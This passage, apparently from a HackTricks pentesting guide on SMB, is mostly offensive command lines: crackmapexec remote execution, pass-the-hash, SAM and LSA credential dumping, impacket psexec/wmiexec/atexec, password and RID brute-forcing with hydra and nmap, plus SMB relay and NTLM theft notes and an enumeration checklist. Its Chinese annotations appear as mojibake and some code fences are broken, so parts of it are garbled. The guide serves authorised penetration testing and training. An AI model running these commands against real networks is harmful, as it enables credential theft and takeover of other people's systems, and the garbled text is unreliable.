crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
```

```markdown
ä½¿ç”¨Pass-the-HashæŠ€æœ¯ï¼š
```
```shell
crackmapexec smb 192.168.10.11 -u Administrator -H <NTHASH> -x whoami
```

```markdown
ä½¿ç”¨ä¸åŒçš„æ‰§è¡Œæ–¹æ³•ï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --exec-method {mmcexec,smbexec,atexec,wmiexec}
```

```markdown
è·å–SAMä¿¡æ¯ï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sam
```

```markdown
è·å–LSASSå†…å­˜å“ˆå¸Œï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --lsa
```

```markdown
è·å–ä¼šè¯ä¿¡æ¯ï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions
```

```markdown
è·å–å·²ç™»å½•ç”¨æˆ·ï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --loggedon-users
```

```markdown
æšä¸¾ç£ç›˜ï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks
```

```markdown
æšä¸¾ç”¨æˆ·ï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --users
```

```markdown
æšä¸¾ç»„ï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --groups
```

```markdown
æšä¸¾æœ¬åœ°ç»„ï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --local-groups
```

```markdown
è·å–å¯†ç ç­–ç•¥ï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --pass-pol
```

```markdown
ä½¿ç”¨RIDæš´åŠ›ç ´è§£ï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --rid-brute
```

```markdown
ä½¿ç”¨Pass-The-HashæŠ€æœ¯ï¼š
```
```shell
crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <HASH>
```
```

### [**psexec**](../windows-hardening/ntlm/psexec-and-winexec.md)**/**[**smbexec**](../windows-hardening/ntlm/smbexec.md)

Both options will **create a new service** (using _\pipe\svcctl_ via SMB) in the victim machine and use it to **execute something** (**psexec** will **upload** an executable file to ADMIN$ share and **smbexec** will point to **cmd.exe/powershell.exe** and put in the arguments the payload --**file-less technique-**-).\
**More info** about [**psexec** ](../windows-hardening/ntlm/psexec-and-winexec.md)and [**smbexec**](../windows-hardening/ntlm/smbexec.md).\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
#å¦‚æœæ²¡æœ‰æä¾›å¯†ç ï¼Œå°†ä¼šæç¤ºè¾“å…¥
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # ä½¿ç”¨Pass-the-Hash
```

Using **parameter**`-k` you can authenticate against **kerberos** instead of **NTLM**

### [wmiexec](../windows-hardening/ntlm/wmicexec.md)/dcomexec

Stealthily execute a command shell without touching the disk or running a new service using DCOM via **port 135.**\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
#å¦‚æœæ²¡æœ‰æä¾›å¯†ç ï¼Œå°†ä¼šæç¤ºè¾“å…¥å¯†ç 
./wmiexec.py [[domain/]username[:password]@]<targetName or address> #æç¤ºè¾“å…¥å¯†ç 
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #ä¼ é€’å“ˆå¸Œ
#æ‚¨å¯ä»¥åœ¨å‘½ä»¤çš„æœ«å°¾æ·»åŠ è¦æ‰§è¡Œçš„CMDå‘½ä»¤ï¼Œå¦‚æœä¸è¿™æ ·åšï¼Œå°†æç¤ºä¸€ä¸ªåŠäº¤äº’å¼shell
```

Using **parameter**`-k` you can authenticate against **kerberos** instead of **NTLM**

```bash
#å¦‚æœæ²¡æœ‰æä¾›å¯†ç ï¼Œå°†ä¼šæç¤ºè¾“å…¥å¯†ç 
./dcomexec.py [[domain/]username[:password]@]<targetName or address>
./dcomexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
#æ‚¨å¯ä»¥åœ¨å‘½ä»¤çš„æœ«å°¾æ·»åŠ è¦æ‰§è¡Œçš„CMDå‘½ä»¤ï¼Œå¦‚æœä¸è¿™æ ·åšï¼Œå°†æç¤ºä¸€ä¸ªåŠäº¤äº’å¼shell
```

### [AtExec](../windows-hardening/ntlm/atexec.md)

Execute commands via the Task Scheduler (using _\pipe\atsvc_ via SMB).\
In **kali** it is located on /usr/share/doc/python3-impacket/examples/

```bash
```
./atexec.py [[domain/]username[:password]@]<targetName or address> "command"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```

```
./atexec.py [[åŸŸ/]ç”¨æˆ·å[:å¯†ç ]@]<ç›®æ ‡åç§°æˆ–åœ°å€> "å‘½ä»¤"
./atexec.py -hashes <LM:NT> administrator@10.10.10.175 "whoami"
```
```

## Impacket reference

[https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)

## **Bruteforce users credentials**

**This is not recommended, you could block an account if you exceed the maximum allowed tries**

```bash
```shell
nmap --script smb-brute -p 445 <IP>
ridenum.py <IP> 500 50000 /root/passwds.txt #ä½¿ç”¨ridenum.pyè„šæœ¬å¯¹ridè¿›è¡Œæš´åŠ›ç ´è§£ï¼Œç„¶åå°è¯•å¯¹æ¯ä¸ªç”¨æˆ·åè¿›è¡Œæš´åŠ›ç ´è§£
```
```

## SMB relay attack

This attack uses the Responder toolkit to **capture SMB authentication sessions** on an internal network, and **relays** them to a **target machine**. If the authentication **session is successful**, it will automatically drop you into a **system** **shell**.\
[**More information about this attack here.**](../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

## SMB-Trap

The Windows library URLMon.dll automatically try to authenticaticate to the host when a page tries to access some contect via SMB, for example: `img src="\\10.10.10.10\path\image.jpg"`

This happens with the functions:

* URLDownloadToFile
* URLDownloadToCache
* URLOpenStream
* URLOpenBlockingStream

Which are used by some browsers and tools (like Skype)

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (93).png>)

### SMBTrap using MitMf

![From: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html](<../.gitbook/assets/image (94).png>)

## NTLM Theft

Similar to SMB Trapping, planting malicious files onto a target system (via SMB, for example) can illicit an SMB authentication attempt, allowing the NetNTLMv2 hash to be intercepted with a tool such as Responder. The hash can then be cracked offline or used in an [SMB relay attack](pentesting-smb.md#smb-relay-attack).

[See: ntlm\_theft](../windows-hardening/ntlm/places-to-steal-ntlm-creds.md#ntlm\_theft)

## HackTricks Automatic Commands

```
åè®®åç§°ï¼šSMB
ç«¯å£å·ï¼š137ã€138ã€139
åè®®æè¿°ï¼šæœåŠ¡å™¨æ¶ˆæ¯å—

æ¡ç›®1ï¼š
åç§°ï¼šç¬”è®°
æè¿°ï¼šSMBçš„ç¬”è®°
æ³¨æ„ï¼š|
è™½ç„¶ç«¯å£139åœ¨æŠ€æœ¯ä¸Šè¢«ç§°ä¸ºâ€œNBT over IPâ€ï¼Œç«¯å£445æ˜¯â€œSMB over IPâ€ã€‚SMBä»£è¡¨â€œæœåŠ¡å™¨æ¶ˆæ¯å—â€ã€‚ç°ä»£è¯­è¨€ä¸­ï¼ŒæœåŠ¡å™¨æ¶ˆæ¯å—ä¹Ÿè¢«ç§°ä¸ºå¸¸è§çš„Internetæ–‡ä»¶ç³»ç»Ÿã€‚è¯¥ç³»ç»Ÿä½œä¸ºåº”ç”¨å±‚ç½‘ç»œåè®®ä¸»è¦ç”¨äºåœ¨ç½‘ç»œä¸Šçš„èŠ‚ç‚¹ä¹‹é—´æä¾›å…±äº«è®¿é—®æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£å’Œå…¶ä»–é€šä¿¡æ–¹å¼ã€‚

#æ¯å½“æˆ‘çœ‹åˆ°ä¸€ä¸ªå¼€æ”¾çš„SMBç«¯å£æ—¶ï¼Œæˆ‘æŒ‰ç…§ä»¥ä¸‹é¡ºåºè¿è¡Œè¿™äº›å‘½ä»¤

æ— å‡­è¯
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

æœ‰å‡­è¯
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

æ¡ç›®2ï¼š
åç§°ï¼šEnum4Linux
æè¿°ï¼šå¸¸è§„SMBæ‰«æ
å‘½ä»¤ï¼šenum4linux -a {IP}

æ¡ç›®3ï¼š
åç§°ï¼šNmap SMBæ‰«æ1
æè¿°ï¼šä½¿ç”¨Nmapè¿›è¡ŒSMBæ¼æ´æ‰«æ
å‘½ä»¤ï¼šnmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

æ¡ç›®4ï¼š
åç§°ï¼šNmap SMBæ‰«æ2
æè¿°ï¼šä½¿ç”¨Nmapè¿›è¡ŒSMBæ¼æ´æ‰«æï¼ˆä¸å¤ªå…·ä½“ï¼‰
å‘½ä»¤ï¼šnmap --script smb-vuln* -Pn -p 139,445 {IP}

æ¡ç›®5ï¼š
åç§°ï¼šHydraæš´åŠ›ç ´è§£
æè¿°ï¼šéœ€è¦ç”¨æˆ·å
å‘½ä»¤ï¼šhydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

æ¡ç›®6ï¼š
åç§°ï¼šSMB/SMB2 139/445æ— éœ€è¿è¡Œmsfconsoleçš„mfsæšä¸¾
æè¿°ï¼šSMB/SMB2 139/445æšä¸¾ï¼Œæ— éœ€è¿è¡Œmsfconsole
æ³¨æ„ï¼šæ¥æºäºhttps://github.com/carlospolop/legion
å‘½ä»¤ï¼šmsfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'
```

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
